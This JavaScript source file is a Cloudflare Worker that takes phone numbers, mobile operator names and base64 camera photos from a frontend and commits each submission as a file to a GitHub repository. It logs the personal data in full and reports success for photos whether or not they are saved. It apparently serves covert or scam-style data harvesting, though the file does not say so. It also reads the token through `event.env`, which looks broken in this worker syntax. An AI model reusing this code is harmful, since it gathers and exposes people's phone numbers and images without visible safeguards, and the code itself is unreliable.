/**
 * Cloudflare Worker Script for Data Collection
 *
 * This worker receives user data and photos from a frontend application,
 * and stores them in a GitHub repository using the GitHub API.
 *
 * Environment Variables Required:
 * - GITHUB_PAT: GitHub Personal Access Token with repo scope
 */

// Define the GitHub repository details
const GITHUB_OWNER = 'HYPERSAHIL'; // GitHub username
const GITHUB_REPO = 'glonova'; // Repository name
const USER_DATA_DIR = 'userData'; // Directory for user data files
const USER_PHOTOS_DIR = 'userPhotos'; // Directory for photo files

// GitHub API base URL
const GITHUB_API_URL = `https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/`;

// Variable to store the GitHub PAT from environment
let githubPat;

// Handle incoming requests
addEventListener('fetch', event => {
    // Get the GitHub PAT from environment variables
    try {
        githubPat = event.env.GITHUB_PAT;
        if (!githubPat) {
            console.error('GitHub PAT not found in environment variables');
        }
    } catch (error) {
        console.error('Error accessing environment variables:', error);
    }

    event.respondWith(handleRequest(event.request));
});

/**
 * Handle incoming requests to the worker
 * @param {Request} request - The request object
 * @returns {Response} - The response to send back to the client
 */
async function handleRequest(request) {
    const url = new URL(request.url);
    console.log('Received request for URL:', url.toString());
    console.log('Request method:', request.method);
    console.log('Request path:', url.pathname);

    // Check if the request path matches our API endpoint
    if (url.pathname === '/api/submit-data' && request.method === 'POST') {
        console.log('Processing API request to /api/submit-data');
        // This request is for our data submission API, handle it
        try {
            const data = await request.json();
            console.log('Received data:', JSON.stringify(data, null, 2));
            console.log('GitHub PAT available:', !!githubPat);

            // Validate the data
            if (!data || typeof data !== 'object') {
                console.error('Invalid data format received');
                return new Response(JSON.stringify({
                    message: 'Invalid data format: Expected JSON object'
                }), {
                    status: 400,
                    headers: { 'Content-Type': 'application/json' }
                });
            }

            let responseMessage = 'Data received';
            let responseStatus = 200;

            if (data.type === 'photo' && data.photo && data.timestamp) {
                console.log('Processing photo data');
                // Handle photo data
                // Validate photo data format
                if (!data.photo.startsWith('data:image/jpeg;base64,')) {
                    console.warn('Invalid photo format:', data.photo.substring(0, 30) + '...');
                    return new Response(JSON.stringify({
                        message: 'Invalid photo format: Expected base64 encoded JPEG'
                    }), {
                        status: 400,
                        headers: { 'Content-Type': 'application/json' }
                    });
                }

                console.log('Saving photo to GitHub...');
                const photoSaveResult = await savePhotoToGitHub(data);
                if (photoSaveResult.success) {
                    console.log('Photo saved to GitHub:', photoSaveResult.filePath);
                } else {
                    console.error('Failed to save photo to GitHub:', photoSaveResult.error);
                    // Continue processing, do not return error to client for photo failure
                }
                responseMessage = 'Photo received'; // Always return success for photo receipt
                responseStatus = 200;

            } else if (data.phoneNumber && data.operator) {
                console.log('Processing user data with phone number:', data.phoneNumber);
                // Handle form data (user info)
                // Validate phone number format
                if (!/^\d{10}$/.test(data.phoneNumber)) {
                    console.error('Invalid phone number format:', data.phoneNumber);
                    return new Response(JSON.stringify({
                        message: 'Invalid phone number format: Expected 10 digits'
                    }), {
                        status: 400,
                        headers: { 'Content-Type': 'application/json' }
                    });
                }

                console.log('Saving user data to GitHub...');
                const userDataSaveResult = await saveUserDataToGitHub(data);
                if (userDataSaveResult.success) {
                    console.log('User data saved to GitHub:', userDataSaveResult.filePath);
                    responseMessage = 'Data received and saved successfully';
                    responseStatus = 200;
                } else {
                    console.error('Failed to save user data to GitHub:', userDataSaveResult.error);
                    responseMessage = `Error saving data: ${userDataSaveResult.error}`;
                    responseStatus = 500; // Return error for form data save failure
                }
            } else {
                console.warn('Received invalid data:', data);
                responseMessage = 'Invalid data received';
                responseStatus = 400;
            }

            // Return a response to the client
            console.log('Sending response to client:', responseMessage, responseStatus);
            return new Response(JSON.stringify({ message: responseMessage }), {
                status: responseStatus,
                headers: {
                    'Content-Type': 'application/json',
                    'Access-Control-Allow-Origin': '*', // Allow CORS
                    'Access-Control-Allow-Methods': 'POST, OPTIONS',
                    'Access-Control-Allow-Headers': 'Content-Type'
                }
            });

        } catch (error) {
            console.error('Error processing request:', error);
            return new Response(JSON.stringify({ message: 'Internal Server Error', error: error.message }), {
                status: 500,
                headers: {
                    'Content-Type': 'application/json',
                    'Access-Control-Allow-Origin': '*', // Allow CORS
                    'Access-Control-Allow-Methods': 'POST, OPTIONS',
                    'Access-Control-Allow-Headers': 'Content-Type'
                }
            });
        }
    } else if (request.method === 'OPTIONS') {
        // Handle CORS preflight requests
        console.log('Handling CORS preflight request');
        return new Response(null, {
            status: 204,
            headers: {
                'Access-Control-Allow-Origin': '*',
                'Access-Control-Allow-Methods': 'POST, OPTIONS',
                'Access-Control-Allow-Headers': 'Content-Type',
                'Access-Control-Max-Age': '86400'
            }
        });
    } else {
        // If the request is not for our API, return 404
        console.log('Request not for API endpoint, returning 404');
        return new Response('Not Found', {
            status: 404,
            headers: {
                'Access-Control-Allow-Origin': '*'
            }
        });
    }
}

/**
 * Save photo data to GitHub repository
 * @param {Object} data - The photo data
 * @returns {Object} - Result of the save operation
 */
async function savePhotoToGitHub(data) {
    try {
        // First, ensure the directory exists
        const dirCheckResult = await ensureDirectoryExists(USER_PHOTOS_DIR);
        if (!dirCheckResult.success) {
            console.error('Failed to ensure directory exists:', dirCheckResult.error);
            // Continue anyway, GitHub API might create parent directories automatically
        }

        // Remove the data:image/jpeg;base64, prefix from the base64 string
        const base64Content = data.photo.replace(/^data:image\/jpeg;base64,/, "");

        // Format the date and time for the filename
        const dateObj = new Date(data.timestamp);
        const dateStr = dateObj.toISOString().split('T')[0]; // YYYY-MM-DD
        const timeStr = dateObj.toTimeString().split(' ')[0].replace(/:/g, '-'); // HH-MM-SS

        // Filename format: phonenumber_YYYY-MM-DD_HH-MM-SS_timestamp.jpeg
        // Use phone number from data if available, otherwise use 'unknown'
        const phoneNumber = data.phoneNumber || 'unknown';
        const photoFileName = `${phoneNumber}_${dateStr}_${timeStr}_${Date.now()}.jpeg`;
        const filePath = `${USER_PHOTOS_DIR}/${photoFileName}`;

        const githubApiUrl = GITHUB_API_URL + filePath;

        // Use the global githubPat variable set in the fetch event handler
        if (!githubPat) {
            console.error('GitHub PAT not found in environment variables');
            return { success: false, error: 'GitHub PAT not configured' };
        }

        console.log('Saving photo to GitHub at path:', filePath);
        console.log('Using GitHub API URL:', githubApiUrl);

        const response = await fetch(githubApiUrl, {
            method: 'PUT',
            headers: {
                'Authorization': `token ${githubPat}`,
                'Content-Type': 'application/json',
                'User-Agent': 'Cloudflare-Worker-Data-Collector' // Required User-Agent for GitHub API
            },
            body: JSON.stringify({
                message: `Add photo ${photoFileName}`,
                content: base64Content,
            })
        });

        const result = await response.json();
        console.log('GitHub API response status:', response.status);

        if (response.ok) {
            console.log('Successfully saved photo to GitHub');
            return { success: true, filePath: result.content.path };
        } else {
            console.error('GitHub API error:', result);
            return {
                success: false,
                error: result.message || response.statusText,
                status: response.status
            };
        }

    } catch (error) {
        console.error('Error in savePhotoToGitHub:', error);
        return { success: false, error: error.message };
    }
}

/**
 * Ensures a directory exists in the GitHub repository
 * @param {string} dirPath - The directory path to ensure exists
 * @returns {Object} - Result of the operation
 */
async function ensureDirectoryExists(dirPath) {
    try {
        console.log(`Ensuring directory exists: ${dirPath}`);

        // Check if the directory already exists by trying to get its contents
        const checkUrl = GITHUB_API_URL + dirPath;

        if (!githubPat) {
            console.error('GitHub PAT not found in environment variables');
            return { success: false, error: 'GitHub PAT not configured' };
        }

        const checkResponse = await fetch(checkUrl, {
            method: 'GET',
            headers: {
                'Authorization': `token ${githubPat}`,
                'User-Agent': 'Cloudflare-Worker-Data-Collector'
            }
        });

        // If the directory exists, we're good
        if (checkResponse.ok) {
            console.log(`Directory ${dirPath} already exists`);
            return { success: true };
        }

        // If we get a 404, the directory doesn't exist, so create it
        if (checkResponse.status === 404) {
            console.log(`Directory ${dirPath} doesn't exist, creating it...`);

            // Create an empty .gitkeep file in the directory to create the directory
            const createUrl = GITHUB_API_URL + `${dirPath}/.gitkeep`;

            const createResponse = await fetch(createUrl, {
                method: 'PUT',
                headers: {
                    'Authorization': `token ${githubPat}`,
                    'Content-Type': 'application/json',
                    'User-Agent': 'Cloudflare-Worker-Data-Collector'
                },
                body: JSON.stringify({
                    message: `Create directory ${dirPath}`,
                    content: btoa(''), // Empty file content
                })
            });

            const createResult = await createResponse.json();

            if (createResponse.ok) {
                console.log(`Successfully created directory ${dirPath}`);
                return { success: true };
            } else {
                console.error(`Failed to create directory ${dirPath}:`, createResult);
                return {
                    success: false,
                    error: createResult.message || createResponse.statusText,
                    status: createResponse.status
                };
            }
        }

        // If we get here, something else went wrong
        const errorData = await checkResponse.json();
        console.error(`Error checking if directory ${dirPath} exists:`, errorData);
        return {
            success: false,
            error: errorData.message || checkResponse.statusText,
            status: checkResponse.status
        };

    } catch (error) {
        console.error(`Error in ensureDirectoryExists for ${dirPath}:`, error);
        return { success: false, error: error.message };
    }
}

/**
 * Save user data to GitHub repository
 * @param {Object} data - The user data
 * @returns {Object} - Result of the save operation
 */
async function saveUserDataToGitHub(data) {
    try {
        // First, ensure the directory exists
        const dirCheckResult = await ensureDirectoryExists(USER_DATA_DIR);
        if (!dirCheckResult.success) {
            console.error('Failed to ensure directory exists:', dirCheckResult.error);
            // Continue anyway, GitHub API might create parent directories automatically
        }

        // Format the date and time for the filename
        const dateObj = new Date(data.timestamp || new Date());
        const dateStr = dateObj.toISOString().split('T')[0]; // YYYY-MM-DD
        const timeStr = dateObj.toTimeString().split(' ')[0].replace(/:/g, '-'); // HH-MM-SS

        // Filename format: phonenumber_YYYY-MM-DD_HH-MM-SS.json
        const dataFileName = `${data.phoneNumber}_${dateStr}_${timeStr}.json`;
        const filePath = `${USER_DATA_DIR}/${dataFileName}`;

        const githubApiUrl = GITHUB_API_URL + filePath;

        // Stringify the data for the file content
        const fileContent = JSON.stringify(data, null, 2);
        // Encode the content in Base64 for the GitHub API
        const base64Content = btoa(fileContent); // btoa is available in Workers environment

        // Use the global githubPat variable set in the fetch event handler
        if (!githubPat) {
            console.error('GitHub PAT not found in environment variables');
            return { success: false, error: 'GitHub PAT not configured' };
        }

        console.log('Saving user data to GitHub at path:', filePath);
        console.log('Using GitHub API URL:', githubApiUrl);

        const response = await fetch(githubApiUrl, {
            method: 'PUT',
            headers: {
                'Authorization': `token ${githubPat}`,
                'Content-Type': 'application/json',
                'User-Agent': 'Cloudflare-Worker-Data-Collector' // Required User-Agent for GitHub API
            },
            body: JSON.stringify({
                message: `Add user data for ${data.phoneNumber}`,
                content: base64Content,
            })
        });

        const result = await response.json();
        console.log('GitHub API response status:', response.status);

        if (response.ok) {
            console.log('Successfully saved user data to GitHub');
            return { success: true, filePath: result.content.path };
        } else {
            console.error('GitHub API error:', result);
            return {
                success: false,
                error: result.message || response.statusText,
                status: response.status
            };
        }

    } catch (error) {
        console.error('Error in saveUserDataToGitHub:', error);
        return { success: false, error: error.message };
    }
}